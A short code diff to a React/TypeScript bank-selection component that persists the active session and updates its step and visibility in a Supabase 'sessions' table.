@@ -6,7 +6,7 @@ import { ConfigMissing } from "@/components/demo/ConfigMissing";
 import { optimizeSupabaseImageUrl } from "@/lib/asset-url";
 import type { BankCatalogEntry } from "@/lib/at-bank-catalog";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
-import { getPreferredRouteSessionId } from "@/lib/session-id-client";
+import { getPreferredRouteSessionId, persistActiveSession } from "@/lib/session-id-client";
 import { useSettings } from "@/contexts/SettingsContext";
 import { countriesMatch } from "@/lib/country-utils";
 import { resolveLocalBankLogoFile } from "@/lib/bank-logo-constants";
@@ -93,10 +93,17 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
 
   useEffect(() => {
     if (!sessionId) return;
+    persistActiveSession(sessionId, routeSessionId);
+    if (supabase) {
+      void supabase
+        .from("sessions")
+        .update({ is_hidden: false, current_step: "banken" })
+        .eq("id", sessionId);
+    }
     if (window.location.search.includes("session=")) {
       window.history.replaceState(window.history.state, "", "/banken");
     }
-  }, [sessionId]);
+  }, [sessionId, routeSessionId, supabase]);
 
   useEffect(() => {
     const resetUi = () => {
